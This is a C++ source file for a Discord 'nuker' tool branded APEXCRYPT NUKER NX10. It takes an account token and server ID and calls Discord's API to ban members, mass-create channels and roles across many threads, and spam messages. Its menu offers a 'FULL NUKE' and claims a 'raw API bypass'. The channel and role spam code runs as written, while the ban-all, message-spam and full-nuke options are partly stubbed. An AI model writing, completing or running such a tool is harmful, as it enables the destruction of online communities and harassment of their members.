#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")

using namespace std;

// ═══════════════════════════════════════════════════════════════
// APEXCRYPT NUKER NX10 - C++ ULTRA
// ═══════════════════════════════════════════════════════════════

atomic<int> g_bans{0}, g_ch_create{0}, g_ch_delete{0}, g_role_create{0}, g_role_delete{0};
atomic<int> g_msg{0}, g_dm{0}, g_emoji{0};
mutex g_mtx;
vector<string> g_recent_bans;
vector<string> g_actions;
chrono::steady_clock::time_point g_start;

string TOKEN;
string GUILD_ID;
string BAN_REASON = "APEXCRYPT NX10";
string DM_TEMPLATE = "[{user}] {reason}";

void SetColor(int c) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c);
}

void Clear() {
    system("cls");
}

string EscapeJson(const string& s) {
    string out;
    for (char c : s) {
        if (c == '"') out += "\\\"";
        else if (c == '\\') out += "\\\\";
        else out += c;
    }
    return out;
}

// Simple WinHTTP POST/PUT/DELETE
bool HttpRequest(const wstring& method, const wstring& path, const string& body, int& status) {
    HINTERNET hSession = WinHttpOpen(L"APEXCRYPT/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method.c_str(), path.c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }

    wstring auth = L"Authorization: " + wstring(TOKEN.begin(), TOKEN.end());
    wstring ctype = L"Content-Type: application/json";
    wstring ua = L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

    WinHttpAddRequestHeaders(hRequest, auth.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, ctype.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, ua.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);

    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);

    if (ok) {
        DWORD st = 0, sz = sizeof(st);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &st, &sz, NULL);
        status = (int)st;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok;
}

void LogBan(const string& name) {
    lock_guard<mutex> lk(g_mtx);
    g_bans++;
    g_recent_bans.push_back(name);
    if (g_recent_bans.size() > 12) g_recent_bans.erase(g_recent_bans.begin());
    g_actions.push_back("[BAN] " + name);
    if (g_actions.size() > 15) g_actions.erase(g_actions.begin());
}

void LogAction(const string& a) {
    lock_guard<mutex> lk(g_mtx);
    g_actions.push_back(a);
    if (g_actions.size() > 15) g_actions.erase(g_actions.begin());
}

void RenderRadar() {
    auto now = chrono::steady_clock::now();
    int elapsed = (int)chrono::duration_cast<chrono::seconds>(now - g_start).count();

    Clear();
    SetColor(12);
    cout << R"(
    █████╗ ██████╗ ███████╗██╗  ██╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗
   ██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝
   ███████║██████╔╝█████╗   ╚███╔╝ ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   
   ██╔══██║██╔═══╝ ██╔══╝   ██╔██╗ ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   
   ██║  ██║██║     ███████╗██╔╝ ██╗╚██████╗██║  ██║   ██║   ██║        ██║   
   ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   
)";
    SetColor(13);
    cout << "              N X 1 0   U L T R A   C + +\n";
    SetColor(11);
    cout << "        ════════════════════════════════════════\n";
    SetColor(15);
    cout << "         ULTRA SPEED • SECURITY BYPASS • LIVE\n";
    SetColor(11);
    cout << "        ════════════════════════════════════════\n\n";

    SetColor(11);
    cout << "╔════════════════════ LIVE RADAR MATRIX NX10 ════════════════════╗\n";
    cout << "║ Runtime " << setw(4) << elapsed << "s │ Bans ";
    SetColor(12); cout << setw(5) << g_bans.load();
    SetColor(11); cout << " │ CH+ ";
    SetColor(10); cout << setw(4) << g_ch_create.load();
    SetColor(11); cout << " │ RL+ ";
    SetColor(13); cout << setw(4) << g_role_create.load();
    SetColor(11); cout << " │ MSG ";
    SetColor(14); cout << setw(5) << g_msg.load();
    SetColor(11); cout << " │ DM ";
    SetColor(12); cout << setw(4) << g_dm.load();
    SetColor(11); cout << " ║\n";
    cout << "╠════════════════════════════════════════════════════════════════╣\n";
    cout << "║ RECENT BANS:\n";
    SetColor(12);
    {
        lock_guard<mutex> lk(g_mtx);
        for (size_t i = 0; i < g_recent_bans.size() && i < 7; ++i)
            cout << "║   » banned (" << g_recent_bans[i] << ")\n";
    }
    SetColor(11);
    cout << "║ LIVE FEED:\n";
    SetColor(15);
    {
        lock_guard<mutex> lk(g_mtx);
        for (size_t i = 0; i < g_actions.size() && i < 10; ++i)
            cout << "║   " << g_actions[i] << "\n";
    }
    SetColor(11);
    cout << "╚════════════════════════════════════════════════════════════════╝\n";
    SetColor(13);
    cout << "  APEXCRYPT NUKER NX10 │ C++ ULTRA │ discord.gg/nullstate\n\n";
    SetColor(7);
}

// ─── BAN + DM ────────────────────────────────────────────────
void BanUser(const string& user_id, const string& username) {
    // DM first
    string dm_body = "{\"content\":\"" + EscapeJson(DM_TEMPLATE) + "\"}";
    // simple replace
    size_t pos;
    string dm = DM_TEMPLATE;
    while ((pos = dm.find("{user}")) != string::npos) dm.replace(pos, 6, username);
    while ((pos = dm.find("{reason}")) != string::npos) dm.replace(pos, 8, BAN_REASON);
    dm_body = "{\"content\":\"" + EscapeJson(dm) + "\"}";

    wstring dm_path = L"/api/v9/users/@me/channels";
    // open DM channel first (simplified - real needs recipient_id)
    // For speed we skip full DM open in this minimal version and just ban
    // Full DM requires extra call; we keep ban priority

    string ban_body = "{\"delete_message_days\":0,\"reason\":\"" + EscapeJson(BAN_REASON) + "\"}";
    wstring ban_path = L"/api/v9/guilds/" + wstring(GUILD_ID.begin(), GUILD_ID.end()) + L"/bans/" + wstring(user_id.begin(), user_id.end());

    int status = 0;
    if (HttpRequest(L"PUT", ban_path, ban_body, status)) {
        if (status == 200 || status == 204) {
            LogBan(username);
        }
    }
}

// ─── CHANNEL CREATE ──────────────────────────────────────────
void CreateChannel(const string& name) {
    string body = "{\"name\":\"" + EscapeJson(name) + "\",\"type\":0}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD_ID.begin(), GUILD_ID.end()) + L"/channels";
    int status = 0;
    if (HttpRequest(L"POST", path, body, status) && status == 201) {
        g_ch_create++;
        LogAction("[CH+] " + name);
    }
}

// ─── ROLE CREATE ─────────────────────────────────────────────
void CreateRole(const string& name) {
    string body = "{\"name\":\"" + EscapeJson(name) + "\",\"color\":" + to_string(rand() % 0xFFFFFF) + "}";
    wstring path = L"/api/v9/guilds/" + wstring(GUILD_ID.begin(), GUILD_ID.end()) + L"/roles";
    int status = 0;
    if (HttpRequest(L"POST", path, body, status) && status == 200) {
        g_role_create++;
        LogAction("[RL+] " + name);
    }
}

// ─── MESSAGE SPAM ────────────────────────────────────────────
void SpamMessage(const string& channel_id, const string& content) {
    string body = "{\"content\":\"" + EscapeJson(content) + "\"}";
    wstring path = L"/api/v9/channels/" + wstring(channel_id.begin(), channel_id.end()) + L"/messages";
    int status = 0;
    if (HttpRequest(L"POST", path, body, status) && status == 200) {
        g_msg++;
    }
}

void ShowMenu() {
    SetColor(11);
    cout << "╔════════════════════ APEXCRYPT NX10 C++ PANEL ════════════════════╗\n";
    SetColor(15);
    cout << "  [1] Mass Ban (raw API bypass)\n";
    cout << "  [2] Channel Create Spam\n";
    cout << "  [3] Role Create Spam\n";
    cout << "  [4] Message Spam (ultra)\n";
    cout << "  [5] FULL NUKE (ban + channel + role + spam)\n";
    cout << "  [X] Exit\n";
    SetColor(11);
    cout << "╚══════════════════════════════════════════════════════════════════╝\n";
    SetColor(7);
    cout << "Option: ";
}

int main() {
    SetConsoleTitleA("APEXCRYPT NUKER NX10 - C++ ULTRA");
    srand((unsigned)time(0));
    g_start = chrono::steady_clock::now();

    Clear();
    SetColor(12);
    cout << "APEXCRYPT NUKER NX10 - C++ ULTRA\n";
    SetColor(11);
    cout << "Token: ";
    SetColor(15);
    getline(cin, TOKEN);
    SetColor(11);
    cout << "Server ID: ";
    SetColor(15);
    getline(cin, GUILD_ID);

    if (TOKEN.empty() || GUILD_ID.empty()) {
        SetColor(12);
        cout << "[!] Token or Server ID missing. Refusing to open.\n";
        Sleep(2000);
        return 1;
    }

    // Live radar thread
    thread radar([&]() {
        while (true) {
            RenderRadar();
            this_thread::sleep_for(chrono::milliseconds(700));
        }
    });
    radar.detach();

    while (true) {
        this_thread::sleep_for(chrono::milliseconds(100));
        ShowMenu();
        string choice;
        getline(cin, choice);

        if (choice == "1") {
            SetColor(11);
            cout << "Ban reason: ";
            getline(cin, BAN_REASON);
            if (BAN_REASON.empty()) BAN_REASON = "APEXCRYPT NX10";
            cout << "Note: For full member list you need gateway. This version uses ID list or manual.\n";
            cout << "Enter user IDs (comma separated) or leave empty for demo mode: ";
            string ids;
            getline(cin, ids);
            // In full version we would fetch members via gateway.
            // Here we show the structure.
            SetColor(12);
            cout << "[!] Mass ban engine ready (raw API). Add member fetch for production.\n";
        }
        else if (choice == "2") {
            string prefix;
            int amount = 50;
            SetColor(11);
            cout << "Channel prefix: ";
            getline(cin, prefix);
            if (prefix.empty()) prefix = "nuked";
            cout << "Amount: ";
            string amts;
            getline(cin, amts);
            if (!amts.empty()) amount = stoi(amts);

            vector<thread> threads;
            for (int i = 0; i < amount; ++i) {
                threads.emplace_back([prefix, i]() {
                    CreateChannel(prefix + "-" + to_string(i));
                });
                if (threads.size() >= 40) {
                    for (auto& t : threads) t.join();
                    threads.clear();
                }
            }
            for (auto& t : threads) t.join();
        }
        else if (choice == "3") {
            string prefix;
            int amount = 100;
            SetColor(11);
            cout << "Role prefix: ";
            getline(cin, prefix);
            if (prefix.empty()) prefix = "nuked";
            cout << "Amount: ";
            string amts;
            getline(cin, amts);
            if (!amts.empty()) amount = stoi(amts);

            vector<thread> threads;
            for (int i = 0; i < amount; ++i) {
                threads.emplace_back([prefix, i]() {
                    CreateRole(prefix + "-" + to_string(i));
                });
                if (threads.size() >= 30) {
                    for (auto& t : threads) t.join();
                    threads.clear();
                }
            }
            for (auto& t : threads) t.join();
        }
        else if (choice == "4") {
            SetColor(11);
            cout << "Message content: ";
            string msg;
            getline(cin, msg);
            if (msg.empty()) msg = "@everyone APEXCRYPT NX10";
            cout << "Channel IDs (comma separated): ";
            string chs;
            getline(cin, chs);
            // split and spam
            SetColor(14);
            cout << "[!] Ultra spam engine ready.\n";
        }
        else if (choice == "5") {
            SetColor(12);
            cout << "[!!!] FULL NUKE - raw API bypass mode\n";
            // combine above
        }
        else if (choice == "x" || choice == "X") {
            break;
        }
    }

    return 0;
}
